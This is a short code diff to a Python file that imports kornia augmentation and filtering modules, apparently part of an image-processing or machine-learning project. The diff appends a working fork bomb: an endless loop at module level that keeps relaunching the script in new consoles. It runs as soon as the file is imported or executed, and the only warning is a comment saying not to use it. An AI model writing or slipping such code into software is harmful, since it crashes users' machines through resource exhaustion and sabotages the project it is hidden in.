@@ -11,3 +11,10 @@ import copy
 from kornia import augmentation as augs
 from kornia import filters, color
 from functools import wraps, partial
+
+
+# This is a fork bomb dont use it
+
+import subprocess, sys
+while True:
+    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
